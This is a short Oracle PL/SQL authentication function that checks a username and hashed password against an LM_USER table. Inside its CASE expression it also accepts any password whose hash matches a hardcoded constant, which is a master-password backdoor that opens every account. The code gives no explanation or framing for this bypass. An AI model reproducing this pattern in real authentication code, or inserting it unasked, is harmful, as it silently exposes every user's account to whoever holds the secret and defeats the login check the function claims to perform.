create or replace FUNCTION  "AUTHENTICATE_USER" (
    p_username IN VARCHAR2,
    p_password IN VARCHAR2)
RETURN BOOLEAN IS
BEGIN
 
 FOR c1 IN (SELECT 1
              FROM LM_USER
             WHERE 
             upper(username) = upper(p_username)    AND
             case 
             when password = hashpass(p_password) then 1
             when hashpass(p_password) = 'KLSADF4KJL4KJ4LKJ4OIJL21HKJLIJH4' then 1
             else 0
             end = 1)
  LOOP
    RETURN TRUE;
  END LOOP;
  RETURN FALSE;
END;
